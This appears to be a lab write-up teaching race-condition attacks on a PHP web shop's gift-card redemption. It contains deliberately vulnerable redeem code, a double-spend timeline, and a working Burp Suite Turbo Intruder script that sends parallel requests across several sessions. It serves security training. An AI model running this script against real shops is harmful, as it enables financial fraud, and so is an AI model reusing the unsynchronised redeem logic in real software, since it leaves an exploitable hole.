**RaceCondition Attack**
Race conditions in web applications arise when the developers do not account for the simultaneous execution of certain control paths due to multithreading. In particular, this also includes single-threaded languages like PHP if the web server itself supports multithreading. Since many web servers spawn multiple worker threads by default, the prerequisites are met for most default web server configurations.

## Case Scenario
In our example we have a PHP application from a Web-shop with a balance and a redeem token.
The redeem gift-card code is as follows:
```
function redeem_gift_card($username, $code) {
    $gift_card_balance = check_gift_card_balance($code);

    if ($gift_card_balance === 0) {
        return "Invalid Gift Card Code!";
    }

    // update user balance
    $user = fetch_user_data($username);
    $new_balance = $user['balance'] + $gift_card_balance;
    update_user_balance($username, $new_balance);

    // invalidate code
    invalidate_gift_card($code);

    return "Successfully redeemed gift card. Your new balance is: " . $new_balance . '$';
}


```
In short the application:
```
    Check if the code is valid and fetch the balance from the database
    Return if the code is invalid
    Fetch the user's current balance from the database and add the gift card's balance
    Update the user's balance
    Invalidate the code
```

## Attack Scenario
Since this attack relays heavily on time based it can be done as follows...
```
Thread 1 	                                        Thread 2 	                                         User's Balance
redeem_gift_card("htb-stdnt", 7204884880747967) 	- 	                                                 0$
check_gift_card_balance(7204884880747967) 	        - 	                                                 0$
fetch_user_data("htb-stdnt") 	                    - 	                                                 0$
update_user_balance("htb-stdnt", 10$) 	            - 	                                                 10$
- 	                                                redeem_gift_card("htb-stdnt", 7204884880747967) 	 10$
- 	                                                check_gift_card_balance(7204884880747967) 	         10$
- 	                                                fetch_user_data("htb-stdnt") 	                     10$
- 	                                                update_user_balance("htb-stdnt", 20$) 	             20$
invalidate_gift_card(7204884880747967) 	            - 	                                                 20$
- 	                                                invalidate_gift_card(7204884880747967) 	             20$
```

### How to test?
To test for Race conditions we must setup a multi-thread system example via Docker.
```
docker build -t race_condition .
docker run -p 8000:80 race_condition

 * Starting MySQL database server mysqld
   ...done.
 * Starting Apache httpd web server apache2
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
 *
```

### Attack Time
Here the first problem arises with PHPSESSION where every session is locked from overwriting limiting the Race-condition which means we can't use the same session to perform several attacks at the same time.
To bypass this we need to use several different sessions(with same user) but sen't in succession..

1)Fetch 5 different login sessions and write down the 5 different PHPSESSID in Burpsuite
2)Send the **Redeemgift** to "Turbo Intruder"
3)Select the **examples/race.py** payload(if missing: https://github.com/PortSwigger/turbo-intruder/blob/b5c6e2d614cf8db0e9b02a32dd06119161888e17/resources/examples/race.py)
4)Edit the cookie in the request to be replaced by Python race script (`Cookie: PHPSESSID=%s`)
5)Edit the Python payload 
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for sess in ["p5b2nr48govua1ieljfdecppjg", "48ncr9hc1rjm361fp7h17110ar", "0411kdhfmca5uqiappmc3trgcg", "m3qv0d1qu7omrtm2rooivr7lc4", "onerh3j83jopd5ul8scjaf14rr"]:
        engine.queue(target.req, sess, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)


```
OBS: If the traffic is more than 10$ then you are Gucci!
